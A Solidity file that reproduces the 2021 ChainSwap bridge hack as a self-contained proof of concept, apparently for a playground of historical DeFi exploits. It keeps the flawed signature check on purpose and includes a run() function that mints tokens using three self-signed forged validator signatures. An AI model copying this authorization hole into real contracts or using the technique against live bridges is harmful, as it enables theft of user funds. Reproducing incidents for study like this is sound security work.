// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

// Synthetic standalone exploit for the EVM Playground (2021-07-Chainswap_exp1).
//
// ChainSwap — forgeable validator set / self-authorizing cross-chain mint
// (Ethereum mainnet, July 10–11 2021, ~$8M). The DeFiHackLabs registry PoC is
// a calldata REPLAY of the real attacker tx 0x5c56... but as extracted uses the
// WRONG function selector for the tuple[] arg (0x6c648fca vs canonical
// 0xa653d60c), so it reverts with no tokens moved. The fork state is also too
// thin (no real proxy storage / wrapped token). Hence this self-contained
// synthetic that faithfully reproduces the vulnerable MappingBase.receive
// logic (TokenMapped 0xEc2c74C9e2457d328bc6216858280eA13e740E8a @ solc 0.6.12).
//
// Root cause (from verified source): receive() does
//   signatory = ecrecover(...); require(signatory == signatures[i].signatory, "unauthorized");
// The caller-supplied `signatory` field is never checked against a trusted set.
// Combined with minSignatures=3 (only distinctness) + auto-quota that grants
// 1% of cap to any fresh signatory (lasttime=0), the attacker uses 3 self-signed
// keys and mints for free via _receive (which does _mint here).
// See Chainswap_exp1.md for full details, diagrams, and remediation.

struct Signature {
    address signatory;
    uint8 v;
    bytes32 r;
    bytes32 s;
}

contract ChainswapForgeableValidator {
    // ---- minimal ERC20 (the synthetic bridged token this contract represents) ----
    string public constant name = "ChainSwapSynthetic";
    string public constant symbol = "CSS";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    // ---- the vulnerable MappingBase state (verbatim layout-relevant subset) ----
    bytes32 public constant RECEIVE_TYPEHASH =
        keccak256("Receive(uint256 fromChainId,address to,uint256 nonce,uint256 volume,address signatory)");
    bytes32 public constant DOMAIN_TYPEHASH =
        keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");
    bytes32 public _DOMAIN_SEPARATOR;

    // config that the real contract reads from its Factory; here stored inline
    // so the contract is self-contained (the auth logic is identical).
    uint256 public minSignatures = 3;
    uint256 public fee = 0; // _chargeFee floor; 0 here (the exploit sends no value)
    uint256 public autoQuotaRatio = 0.01 ether; // 1% of cap per signatory
    uint256 public autoQuotaPeriod = 1 days;

    mapping(address => uint256) internal _authQuotas;
    mapping(address => uint256) public lasttimeUpdateQuotaOf;
    mapping(uint256 => mapping(address => mapping(uint256 => uint256))) public received;

    address public attacker;

    constructor() public {
        // No state set here: this contract is vm.etch'd at a FIXED address by the
        // playground recorder (etchAt) so address(this) is known up-front and the
        // forged signatures can be precomputed against it. State is initialized by
        // initialize(), called once via setup before the recorded attack.
    }

    // Called once (vm.etch skips the constructor). Mirrors __MappingToken_init:
    // builds the EIP-712 domain over name+chainId+this and seeds the supply.
    function initialize() external {
        require(_DOMAIN_SEPARATOR == bytes32(0), "initialized");
        _DOMAIN_SEPARATOR = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), _chainId(), address(this)));
        attacker = msg.sender;
        // large supply so each forged signatory's 1%-of-cap quota >> minted volume
        _mint(address(this), 100_000_000 ether);
    }

    function _chainId() internal pure returns (uint256 id) {
        assembly {
            id := chainid()
        }
    }

    function cap() public view returns (uint256) {
        return totalSupply;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply = totalSupply + amount;
        balanceOf[to] = balanceOf[to] + amount;
    }

    // ---- the vulnerable quota auto-saturation (faithful copy) ----
    function authQuotaOf(address signatory) public view returns (uint256 quota) {
        quota = _authQuotas[signatory];
        uint256 ratio = autoQuotaRatio;
        uint256 period = autoQuotaPeriod;
        if (ratio == 0 || period == 0 || period == uint256(-1)) return quota;
        uint256 quotaCap = (cap() * ratio) / 1e18; // 1% of total supply
        // lasttimeUpdateQuotaOf[freshAddr] == 0 => now - 0 is huge => delta saturates
        uint256 delta = (quotaCap * (block.timestamp - lasttimeUpdateQuotaOf[signatory])) / period;
        uint256 a = quota + delta;
        uint256 m = quotaCap < a ? quotaCap : a;
        return quota > m ? quota : m;
    }

    function _chargeFee() internal {
        uint256 f = fee;
        uint256 capfee = 0.1 ether;
        require(msg.value >= (f < capfee ? f : capfee), "fee is too low");
        // accept the fee (kept here); the live contract forwards it to a feeTo.
    }

    // ---- THE VULNERABLE receive() (verbatim authorization logic) ----
    // (named releaseCrossChain here to avoid clashing with Solidity's reserved
    //  `receive()` ether keyword; the authorization logic is identical to the
    //  on-chain MappingBase.receive — selector 0xa653d60c on chain.)
    function releaseCrossChain(
        uint256 fromChainId,
        address to,
        uint256 nonce,
        uint256 volume,
        Signature[] memory signatures
    ) public payable {
        _chargeFee();
        require(received[fromChainId][to][nonce] == 0, "withdrawn already");
        uint256 N = signatures.length;
        require(N >= minSignatures, "too few signatures");
        for (uint256 i = 0; i < N; i++) {
            for (uint256 j = 0; j < i; j++) {
                require(signatures[i].signatory != signatures[j].signatory, "repetitive signatory");
            }
            bytes32 structHash =
                keccak256(abi.encode(RECEIVE_TYPEHASH, fromChainId, to, nonce, volume, signatures[i].signatory));
            bytes32 digest = keccak256(abi.encodePacked("\x19\x01", _DOMAIN_SEPARATOR, structHash));
            address signatory = ecrecover(digest, signatures[i].v, signatures[i].r, signatures[i].s);
            require(signatory != address(0), "invalid signature");
            require(signatory == signatures[i].signatory, "unauthorized"); // <-- the bug: self-referential
            _decreaseAuthQuota(signatures[i].signatory, volume);
        }
        received[fromChainId][to][nonce] = volume;
        _receive(to, volume);
    }

    function _decreaseAuthQuota(address signatory, uint256 decrement) internal {
        // updateAutoQuota modifier inlined: a fresh signatory's quota auto-saturates
        uint256 quota = authQuotaOf(signatory);
        if (_authQuotas[signatory] != quota) {
            _authQuotas[signatory] = quota;
            lasttimeUpdateQuotaOf[signatory] = block.timestamp;
        }
        quota = _authQuotas[signatory] - decrement; // fresh signatory has >= 1% cap, so no underflow
        _authQuotas[signatory] = quota;
    }

    function _receive(address to, uint256 volume) internal {
        _mint(to, volume); // MappingToken side: mint synthetic units to the attacker
    }

    // ---- the attack ------------------------------------------------------------
    // Three fresh, attacker-controlled keypairs were generated off-chain; each
    // signed the EIP-712 Receive digest (chainId=1, to=attacker, nonce=1,
    // volume=19392.28e18) for THIS contract's _DOMAIN_SEPARATOR, and is listed
    // as its own `signatory`. ecrecover==signatory is a tautology for every one.
    function run() external payable {
        require(msg.sender == attacker, "only attacker");
        Signature[] memory sigs = new Signature[](3);
        sigs[0] = Signature({
            signatory: 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf,
            v: 28,
            r: 0x82fc624cbe5762c3a90bf2b2647d036587da163f52609bd4b62583932140eef7,
            s: 0x70a9ff686ea5fcb9a963b4cabb1fa2c9fae8d4c0471f371ded15f2d8445fcdaf
        });
        sigs[1] = Signature({
            signatory: 0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF,
            v: 27,
            r: 0x6b97f2f81330747967de0705e718d6f1da714005cf9c67db23e2dc848c1a5557,
            s: 0x09642b3b3df619c1f4e210d9671e0710c2da9ae00bf078b40dcf804e7fb2592b
        });
        sigs[2] = Signature({
            signatory: 0x6813Eb9362372EEF6200f3b1dbC3f819671cBA69,
            v: 28,
            r: 0x717fcbe0c53fc67a78ee48f50dd2f7279ecfb643578842f9260a9156a5d84df8,
            s: 0x1e72f4e2ef7dd6a2dda5354b5ac8a3472ff6310805d61cca30e3608ad926028c
        });
        // call the vulnerable release() with the bridge fee; mints tokens to attacker.
        releaseCrossChain(1, attacker, 1, 19_392_277_118_050_930_170_440, sigs);
    }
}
